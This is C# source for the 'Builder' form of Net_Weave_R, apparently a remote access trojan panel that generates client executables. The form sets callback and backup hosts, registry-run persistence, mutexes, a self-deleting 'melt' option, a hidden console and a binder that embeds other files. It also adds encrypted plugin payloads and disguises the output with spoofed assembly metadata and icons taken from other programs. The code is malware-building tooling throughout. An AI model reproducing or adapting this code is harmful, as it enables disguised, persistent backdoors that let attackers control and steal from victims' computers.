using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Net_Weave_R.Misc;
using System.Threading;
using Net_Weave_R.Core;
using Net_Weave_R.Forms.Popups;
using Net_Weave_R.Forms.Dialogs;
using NWR_Client;
using NetLib.Networking;
using System.IO;
using NetLib.Misc;
using Mono.Cecil;
using System.Reflection;
using Net_Weave_R.Properties;
using System.CodeDom.Compiler;
using Mono.Cecil.Cil;
using System.Resources;
using Microsoft.Win32;
namespace Net_Weave_R.Forms
{
    public partial class Builder : Form
    {

        //SIZE = 379, 271
        int index = 0;
        SortedList<int, CarbonGroupBox> boxList = new SortedList<int, CarbonGroupBox>();
        string saveLoc;
        public Builder()
        {
            InitializeComponent();
            Functions.Center(this);
            Icon = GlobalProperties.ApplicationIcon;
            PluginHelper.PluginChanged += new EventHandler(PluginHelper_PluginChanged);
            boxList.Add(0, boxProfiles);
            boxList.Add(1, boxHosts);
            boxList.Add(2, boxInstallation);
            boxList.Add(3, boxPlugins);
            boxList.Add(4, boxProcess);
            boxList.Add(5, boxBinder);
            LoadPlugins();
            saveLoc = string.Empty;
            GlobalProperties.Client.DataReceived += new EventHandler<NWR_Client.DataReceivedEventArgs>(Client_DataReceived);
            LoadProfiles();
        }

        void Client_DataReceived(object sender, NWR_Client.DataReceivedEventArgs e)
        {
            Invoke((MethodInvoker)delegate
            {
                PacketReader r = e.Reader;

                switch ((Header)e.Header)
                {
                    case Header.BUILD:
                        int len = r.ReadInt32();
                        byte[] b = r.ReadBytes(len);
                        string binderResName = r.ReadString();
                        string pluginResName = r.ReadString();
                        MemoryStream ms = new MemoryStream(b);
                        AssemblyDefinition asm = AssemblyDefinition.ReadAssembly(ms);
                        ms.Close();
                        ms.Dispose();
                        len = 0;
                        Invoke((MethodInvoker)delegate
                        {
                            len = lstBinder.Items.Count;
                        });
                        if (len > 0)
                        {
                            ms = new MemoryStream();
                            BinaryWriter wr = new BinaryWriter(ms);
                            for (int i = 0; i < lstBinder.Items.Count; i++)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    string name = lstBinder.Items[i].Text;
                                    string fileName = lstBinder.Items[i].SubItems[1].Text;
                                    byte[] file = File.ReadAllBytes(fileName);
                                    wr.Write(name);
                                    wr.Write(file.Length);
                                    wr.Write(file);
                                });
                            }
                            wr.Close();
                            byte[] bData = Encryption.Encrypt(ms.ToArray(), false);
                            EmbeddedResource bRes = new EmbeddedResource(binderResName, ManifestResourceAttributes.Private, bData);
                            asm.MainModule.Resources.Add(bRes);
                            ms.Dispose();
                        }
                        Invoke((MethodInvoker)delegate
                        {
                            len = lstPlugins.CheckedItems.Count;
                        });
                        if (len > 0)
                        {
                            ms = new MemoryStream();
                            BinaryWriter br = new BinaryWriter(ms);
                            Invoke((MethodInvoker)delegate
                            {
                                for (int i = 0; i < lstPlugins.CheckedItems.Count; i++)
                                {
                                    byte[] plugin = GlobalProperties.RawPlugins[(Guid)lstPlugins.CheckedItems[i].Tag];
                                    plugin = Encryption.Encrypt(plugin, false);
                                    br.Write(plugin.Length);
                                    br.Write(plugin);
                                }
                            });
                            br.Close();
                            byte[] data = Encryption.Encrypt(ms.ToArray(), false);
                            EmbeddedResource res = new EmbeddedResource(pluginResName, ManifestResourceAttributes.Private, data);
                            asm.MainModule.Resources.Add(res);
                        }

                        asm.Write(saveLoc);
                        //if (!xCrypt.Checked)
                        //{
                        if (GlobalProperties.BuildAssembly != null)
                        {
                            if (!string.IsNullOrEmpty(GlobalProperties.BuildAssembly.IconPath))
                            {
                                if (GlobalProperties.BuildAssembly.IconPath.ToLower().EndsWith(".exe"))
                                {
                                    try
                                    {
                                        IconExtractor iconEx = new IconExtractor(GlobalProperties.BuildAssembly.IconPath);
                                        Icon icon = null;
                                        if (iconEx.IconCount > 1)
                                        {
                                            SortedList<int, Icon> icons = new SortedList<int, Icon>();
                                            for (int i = 0; i < iconEx.IconCount; i++)
                                            {
                                                icons.Add(i, iconEx.GetIcon(i));
                                            }
                                            IconSelecterDialog isd = new IconSelecterDialog(icons);
                                            if (isd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                                            {
                                                icon = iconEx.GetIcon(0);
                                            }
                                            isd.Dispose();
                                            icon = iconEx.GetIcon(isd.Selected);
                                        }
                                        else if (iconEx.IconCount == 1)
                                        {
                                            icon = iconEx.GetIcon(0);
                                        }
                                        else
                                        {
                                            throw new Exception();
                                        }
                                        FileStream fs = new FileStream("Icon.ico", FileMode.Create);
                                        icon.Save(fs);
                                        fs.Close();
                                    }
                                    catch
                                    {
                                    }
                                }
                                else if (GlobalProperties.BuildAssembly.IconPath.ToLower().EndsWith(".ico"))
                                {
                                    File.Copy(GlobalProperties.BuildAssembly.IconPath, "Icon.ico");
                                }
                                if (File.Exists("Icon.ico"))
                                {
                                    IconInjector.InjectIcon("Icon.ico", saveLoc);
                                    File.Delete("Icon.ico");
                                }
                            }
                        }
                        //}
                        //else
                        //{
                        //    byte[] file = File.ReadAllBytes(saveLoc);
                        //    File.Delete(saveLoc);
                        //    BuildCry(file, saveLoc);
                        //}
                        MessageBox.Show("Build Successful!", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                }
            });
        }

        void PluginHelper_PluginChanged(object sender, EventArgs e)
        {
            LoadPlugins();
        }
        void LoadPlugins()
        {
            lstPlugins.Items.Clear();

            foreach (XPlugin plugin in GlobalProperties.InitializedPlugins.Values)
            {
                ListViewItem i = new ListViewItem();
                i.Text = plugin.Name;
                i.SubItems.Add(plugin.Description);
                i.SubItems.Add(plugin.Version.ToString());
                i.SubItems.Add(plugin.Author);
                i.Tag = plugin.Guid;
                lstPlugins.Items.Add(i);
            }
        }
        #region Fade
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            PluginHelper.PluginChanged -= PluginHelper_PluginChanged;
            GlobalProperties.Client.DataReceived -= Client_DataReceived;
            if (Opacity != 0.0)
            {
                e.Cancel = true;
                new Thread(() =>
                {
                    while (Opacity != 0.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity -= 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnFormClosing(e);
                        Close();
                    });
                }).Start();
            }
        }
        protected override void OnVisibleChanged(EventArgs e)
        {
            if (Visible)
            {
                Opacity = 0.0;
                new Thread(() =>
                {
                    while (Opacity != 1.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity += 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnVisibleChanged(e);
                    });
                }).Start();
            }
        }
        #endregion

        private void btnViewPass_Click(object sender, EventArgs e)
        {
            MessageBox.Show(txtPassword.Text);
        }

        private void btnViewUpdatePass_Click(object sender, EventArgs e)
        {
            MessageBox.Show(txtUpdatePassword.Text);
        }

        private void btnBack_Click(object sender, EventArgs e)
        {
            if (index == 0)
                return;
            index--;
            changeBox();
        }

        private void btnForward_Click(object sender, EventArgs e)
        {
            if (index == boxList.Count - 1)
                return;
            index++;
            changeBox();
        }

        void changeBox()
        {
            boxList[index].BringToFront();
            btnBack.BringToFront();
            btnForward.BringToFront();
        }

        private void btnEditAssembly_Click(object sender, EventArgs e)
        {
            AssemblyEditor ae = new AssemblyEditor();
            ae.ShowDialog();
            ae.Dispose();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog o = new SaveFileDialog() { Filter = "Executeables (*.exe)|*.exe" })
            {
                if (o.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    saveLoc = o.FileName;
                    Build();
                }
            }
        }
        void Build()
        {
            PacketWriter w = new PacketWriter();
            w.Write((int)Header.BUILD);
            w.Write(txtHost.Text);
            w.Write(int.Parse(txtPort.Text));
            w.Write(xBackup.Checked);
            w.Write(txtBackupHost.Text);
            w.Write(int.Parse(txtBackupPort.Text));
            w.Write(txtPassword.Text);
            w.Write(txtUpdatePassword.Text);
            w.Write(xInstall.Checked);
            w.Write(xHKCU.Checked);
            w.Write(txtHKCU.Text);
            w.Write(xHKLM.Checked);
            w.Write(txtHKLM.Text);
            w.Write(txtFolderName.Text);
            w.Write(txtFilename.Text);
            w.Write(txtPluginStoreLoc.Text);
            w.Write(txtPluginStoreName.Text);
            w.Write(txtMutex.Text);
            w.Write(xVisMode.Checked);
            w.Write(xShowConsole.Checked);
            w.Write(xMelt.Checked);
            w.Write((lstBinder.Items.Count > 0) ? true : false);
            w.Write((lstPlugins.CheckedItems.Count > 0) ? true : false);

            IAssembly asm = GlobalProperties.BuildAssembly;
            w.Write((asm == null) ? false : true);
            if (asm != null)
            {
                w.Write(asm.Title);
                w.Write(asm.Description);
                w.Write(asm.Configuration);
                w.Write(asm.Company);
                w.Write(asm.Title);
                w.Write(asm.Copyright);
                w.Write(asm.Culture);
                w.Write(asm.Guid);
                w.Write(asm.AssemblyVersion);
                w.Write(asm.AssemblyFileVersion);
            }
            string args = "/filealign:512 /platform:anycpu";
            if (!xShowConsole.Checked)
                args += " /target:winexe";
            //else
            //    args += " /debug";
            w.Write(args);

            Console.WriteLine(GlobalProperties.Client.Send(w.ToArray(true)));

        }

        void Rep(ref string scr, string toRep, string rep)
        {
            scr = scr.Replace(toRep, rep);
        }
        private void btnRandomPluginStoreLoc_Click(object sender, EventArgs e)
        {
            string s = @"Software\Microsoft\Windows\" + "{" + Guid.NewGuid().ToString().ToUpper() + "}";
            txtPluginStoreLoc.Text = s;
        }

        private void btnRandomPluginStoreName_Click(object sender, EventArgs e)
        {
            txtPluginStoreName.Text = genString();
        }

        const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        string genString()
        {
            string final = "";
            Random r = new Random();
            int len = 8;
            for (int i = 0; i < len; i++)
            {
                final += chars[r.Next(0, chars.Length)];
            }
            return final.ToUpper();
        }

        private void btnGenMutex_Click(object sender, EventArgs e)
        {
            txtMutex.Text = genString();
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog o = new OpenFileDialog() { Filter = "All Files (*.*)|*.*" })
            {
                if (o.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    for (int x = 0; x < o.FileNames.Length; x++)
                    {
                        FileInfo info = new FileInfo(o.FileNames[x]);
                        ListViewItem i = new ListViewItem();
                        i.Text = o.SafeFileName;
                        i.SubItems.Add(o.FileName);
                        i.SubItems.Add(Functions.FormatBytes(info.Length));
                        info = null;
                        lstBinder.Items.Add(i);
                    }
                }
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lstBinder.Items)
                i.Remove();
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstBinder.Items.Clear();
        }

        private void btnCreateProfile_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtCreateProfileName.Text))
            {
                MessageBox.Show("Name can not be null.", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            foreach (ListViewItem i in lstProfiles.Items)
            {
                if (i.Text == txtCreateProfileName.Text)
                {
                    MessageBox.Show("Profile with this name already exists.", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }


            ProfileData d = new ProfileData();
            ListViewItem item = new ListViewItem();
            item.Text = txtCreateProfileName.Text;
            item.SubItems.Add("");
            item.Tag = d;
            d.Name = item.Text;
            lstProfiles.Items.Add(item);
            lstProfiles.Items[lstProfiles.Items.Count - 1].Selected = true;
        }
        void LoadProfiles()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(Net_Weave_R.Misc.Settings.Reg);
                string[] names = key.GetValueNames();

                for (int i = 0; i < names.Length; i++)
                {
                    if (names[i].Contains("PROFILE_"))
                    {
                        LoadProfile(names[i]);
                    }
                }
            }
            catch { }
        }
        void LoadProfile(string name)
        {
            try
            {
                SettingsReader r = new SettingsReader(Net_Weave_R.Misc.Settings.Reg, name);
                ProfileData d = r.Read<ProfileData>("DATA");
                r.Dispose();

                ListViewItem i = new ListViewItem();
                i.Text = d.Name;
                i.SubItems.Add(d.LastModified);
                i.Tag = d;
                lstProfiles.Items.Add(i);
            }
            catch
            {
            }
        }

        void DeleteProfile(string id)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(Net_Weave_R.Misc.Settings.Reg);
                string[] names = key.GetValueNames();

                for (int i = 0; i < names.Length; i++)
                {
                    if (names[i] == "PROFILE_" + id)
                    {
                        key.DeleteValue(names[i]);
                        break;
                    }
                }
            }
            catch { }
        }
        private void btnOpenProfile_Click(object sender, EventArgs e)
        {
            if (lstProfiles.SelectedItems.Count == 0)
            {
                MessageBox.Show("No Profile Selected.", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ProfileData d = (ProfileData)lstProfiles.SelectedItems[0].Tag;

            txtHost.Text = d.Host;
            txtPort.Text = d.Port.ToString();
            txtBackupHost.Text = d.BackupHost;
            txtBackupPort.Text = d.BackupPort.ToString();
            xBackup.Checked = d.EnableBackupHost;
            txtPassword.Text = d.ConnectionPassword;
            txtUpdatePassword.Text = d.UninstallPassword;
            xInstall.Checked = d.Install;
            xHKCU.Checked = d.Hkcu;
            txtHKCU.Text = d.HkcuKey;
            xHKLM.Checked = d.Hklm;
            txtHKLM.Text = d.HklmKey;
            txtFolderName.Text = d.DirectoryName;
            txtFilename.Text = d.FileName;
            txtPluginStoreLoc.Text = d.PluginRegLocation;
            txtPluginStoreName.Text = d.PluginRegName;
            txtMutex.Text = d.Mutex;
            xVisMode.Checked = d.VisibleMode;
            xShowConsole.Enabled = d.ShowConsole;
            xMelt.Checked = d.Melt;
        }

        private void btnDeleteProfile_Click(object sender, EventArgs e)
        {
            if (lstProfiles.SelectedItems.Count != 1)
                return;

            DeleteProfile(((ProfileData)lstProfiles.SelectedItems[0].Tag).ID.ToString());
            lstProfiles.SelectedItems[0].Remove();
        }

        private void btnSaveProfile_Click(object sender, EventArgs e)
        {
            if (lstProfiles.SelectedItems.Count == 0)
            {
                MessageBox.Show("No profiles selected for saving.", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ProfileData d = lstProfiles.SelectedItems[0].Tag as ProfileData;
            d.Host = txtHost.Text;
            d.Port = cint(txtPort.Text);
            d.EnableBackupHost = xBackup.Checked;
            d.ConnectionPassword = txtPassword.Text;
            d.UninstallPassword = txtUpdatePassword.Text;
            d.VisibleMode = xVisMode.Checked;
            d.BackupHost = txtBackupHost.Text;
            d.BackupPort = cint(txtBackupPort.Text);
            d.DirectoryName = txtFolderName.Text;
            d.FileName = txtFilename.Text;
            d.Hkcu = xHKCU.Checked;
            d.HkcuKey = txtHKCU.Text;
            d.Hklm = xHKLM.Checked;
            d.HklmKey = txtHKLM.Text;
            d.ShowConsole = xShowConsole.Checked;
            d.PluginRegName = txtPluginStoreName.Text;
            d.PluginRegLocation = txtPluginStoreLoc.Text;
            d.Mutex = txtMutex.Text;
            d.Melt = xMelt.Checked;
            d.LastModified = DateTime.Now.ToShortDateString();
            d.Install = xInstall.Checked;
            d.Name = lstProfiles.SelectedItems[0].Text;
            lstProfiles.SelectedItems[0].Tag = d;
            lstProfiles.SelectedItems[0].SubItems[1].Text = d.LastModified;

            SettingsWriter w = new SettingsWriter(Net_Weave_R.Misc.Settings.Reg);
            w.Write(d, "DATA");
            w.Close("PROFILE_" + d.ID.ToString());

            MessageBox.Show("Saved.", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        int cint(string s)
        {
            return int.Parse(s);
        }
    }
}
